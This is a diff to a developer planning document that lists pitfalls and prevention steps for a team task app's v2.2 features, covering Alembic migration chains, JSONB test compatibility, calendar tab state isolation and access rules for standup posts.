+The current migration chain head is `d3e4f5a6b7c8` (add_status_transitions). There is one prior merge migration (`f836fa8d42c6`). v2.2 adds at least three new tables (standup posts, knowledge sessions, weekly board posts) plus potential enum extensions. Risks:
+
+1. **Creating a second branch and forgetting to merge.** If standup migrations and KS session migrations are developed in parallel branches and both use `down_revision = "d3e4f5a6b7c8"`, Alembic will detect a branch and `alembic upgrade head` will fail or silently only run one branch.
+
+2. **JSONB column in non-PostgreSQL-compatible migration.** The task snapshot stored as `JSONB` uses `sa.JSON()` in SQLAlchemy, which maps to `JSONB` in PostgreSQL and `JSON` in SQLite. The test suite (`test_e2e.db` in the backend root suggests SQLite is used for tests). SQLite does not support `JSONB`; using `sa.JSON()` works but loses PostgreSQL-specific JSONB operators in queries.
+
+3. **Adding columns to high-traffic tables.** Adding nullable columns to `tasks` (e.g., if the standup model references tasks via FK) is safe in PostgreSQL. Adding `NOT NULL` columns without a default will fail on tables with existing rows.
+
+4. **Migration rollback is not tested.** The existing migrations do not have verified `downgrade()` implementations. If a v2.2 migration is applied to production and needs to be rolled back, an empty `downgrade()` (like `f836fa8d42c6`) will silently do nothing.
+
+### Prevention
+
+- Write all three v2.2 tables (standup posts, knowledge sessions, weekly board) as a single linear migration chain, or as three separate migrations with explicit `down_revision` chaining verified before creation.
+- If the standup and KS migrations are developed in separate feature branches, create a merge migration immediately on integration — do not leave the chain branched.
+- For JSONB columns: use `from sqlalchemy.dialects.postgresql import JSONB` and type the column as `Column(JSONB, nullable=True)` in the model. Accept that tests running on SQLite will use a TEXT fallback. Alternatively, run integration tests against a PostgreSQL container (already used in Docker Compose) rather than SQLite.
+- All new columns on new tables are nullable or have server defaults — no `NOT NULL` without a default on a fresh table since new tables start empty.
+- Write and manually test the `downgrade()` for each new migration during development, not after.
+- The migration for `NotificationEventType` enum extension must use `op.execute` outside a transaction block (see Pitfall 2 above).
+
+### Phase
+
+The migration chain is cross-cutting. Establish the chain before any v2.2 feature phase merges. Verify `alembic history --verbose` shows a single linear chain (no branches) before each phase is marked complete.
+
+---
+
+## 9. Knowledge Session Calendar Tab — Frontend State Leak Between Calendar Modes
+
+### Risk
+
+The existing calendar (`frontend/src/routes/schedule/+page.svelte`) uses a component-local state pattern: `let scheduleList: any[]`, `let taskEvents: EventItem[]`, loaded via `onMount(loadAll)`. The calendar renders a single month view with all event sources merged.
+
+Adding a "Knowledge Sessions" tab inside the same calendar component introduces a new UI mode: users toggle between "My Calendar" and "Knowledge Sessions." Common mistakes:
+
+1. **Shared `showModal` / `editingSchedule` state leaks across tabs.** If the user opens an edit modal for a personal schedule event, then switches to the KS tab, the form state (`form`, `formReminders`) is not cleared, causing the KS create/view modal to display stale values.
+
+2. **`loadAll()` is called once on mount.** Adding KS sessions as a third data source requires either re-fetching on tab switch or fetching all sources in the initial `loadAll`. If KS sessions are fetched on mount but the tab is not initially visible, a network error in the KS fetch will silently break the initial load.
+
+3. **The calendar renders events by `start_time` for the current month.** KS sessions created in other months will not appear even if the user is trying to create one in a future month — the date filter `start >= startOfMonth` must be applied consistently for all event types.
+
+### Prevention
+
+- Keep KS session state (`knowledgeSessions`, `showKSModal`, `editingKS`) as separate variables from the personal schedule state. Do not reuse `editingSchedule` or `form` for both.
+- On tab switch, explicitly clear modal state: reset `showModal = false`, `showKSModal = false`, `editingSchedule = null`, `editingKS = null`.
+- Fetch KS sessions in the same `loadAll()` call to avoid partial-load failures, but make the fetch non-fatal: if the KS endpoint fails, personal calendar still works.
+- Apply the same `start` / `end` date range filter to the KS session API call as to personal schedules.
+- For members (non-supervisors): render KS sessions as read-only items — no create/edit controls. Apply this at the component level via a role check against the user store, not by hiding buttons with CSS.
+
+### Phase
+
+Address in the Knowledge Sharing Scheduler phase. The tab structure must be designed before implementing the API — retrofitting tab isolation into a shared-state component is error-prone.
+
+---
+
+## 10. Standup Post Visibility — RBAC Inconsistency
+
+### Risk
+
+The requirement states standup posts are "visible to all team members and the supervisor." In the existing RBAC model (`UserRole.admin`, `UserRole.supervisor`, `UserRole.member`), "visible to all" means any authenticated user in the team. However, the existing `tasks.py` pattern gates most writes on ownership (`assignee_id == current_user.id` or `creator_id == current_user.id`) and most reads are open.
+
+Two inconsistency risks:
+
+1. **Member A can edit Member B's standup post.** If the standup router only checks `is_authenticated` (no ownership check on PATCH/DELETE), any member can overwrite another's standup.
+
+2. **Supervisor cannot see all standups if the query filters by `author_id = current_user.id`.** If the list endpoint follows the schedule pattern (`WHERE user_id = current_user.id`), supervisors get only their own standups, defeating the supervisory value.
+
+### Prevention
+
+- Standup post ownership rules:
+  - `POST /api/standups/` — any authenticated member creates for themselves (server sets `author_id = current_user.id`, client cannot override this field).
+  - `GET /api/standups/` — members see all team standups (no `author_id` filter); supervisors/admins also see all.
+  - `PATCH /api/standups/{id}`, `DELETE /api/standups/{id}` — only the post author can edit/delete. Add: `if standup.author_id != current_user.id: raise HTTPException(403)`.
+- Do not copy the schedule router pattern which filters all reads by `user_id`. Write the standup router from scratch with these explicit rules.
+- Add a test: authenticate as Member B, attempt PATCH on Member A's standup, assert 403.
+
+### Phase
+
+Address in the standup posts phase. Write the visibility rules as a test fixture before implementing the endpoint — clarifies the rules before code is written.
 
 ---
 
@@ -311,13 +294,14 @@ If this logic is missed during the custom-status migration, tasks marked with a 
 
 | Pitfall | Phase | Severity |
 |---------|-------|----------|
-| Multi-team data leakage (unscoped queries) | Team hierarchy phase | Critical |
-| Custom status enum migration (multi-step) | Custom Kanban status phase | Critical |
-| Alembic migration sequence planning | Before Milestone 2 begins | Critical |
-| Timeline visibility enforcement | Team hierarchy phase (same phase, not deferred) | High |
-| Sprint orphaned tasks + burndown snapshots | Sprint model phase | High |
-| APScheduler job loss on restart (reminders) | Sprint model phase | High |
-| Completion logic tied to hardcoded 'done' | Custom Kanban status phase | High |
-| Task type backfill + KPI historical gap | Task types phase | Medium |
-| N+1 queries on analytics endpoints | KPI analytics phase | Medium |
-| Burndown computed vs snapshot accuracy | Sprint model phase | Medium |
+| KS sessions on separate model (not Schedule) | Knowledge Sharing Scheduler phase | Critical |
+| XSS via `{@html}` without DOMPurify | First markdown-rendering phase (standup or board) | Critical |
+| NotificationEventType enum extension in transaction | KS Scheduler phase | Critical |
+| Task snapshot frozen at post time (JSONB, not live) | Standup posts phase | High |
+| AI summary token budget + caching | Weekly Board phase | High |
+| Standup RBAC: author-only edit, all-team read | Standup posts phase | High |
+| Migration chain branching across parallel features | All v2.2 phases — verify before each merge | High |
+| Notification fatigue — opt-in, not opt-out | Each phase as events are introduced | High |
+| Calendar tab state leak (shared modal state) | KS Scheduler phase (calendar integration) | Medium |
+| AI summary quality — prompt structure | Weekly Board phase | Medium |
+| JSONB vs SQLite test compatibility | Standup posts phase (migration) | Medium |
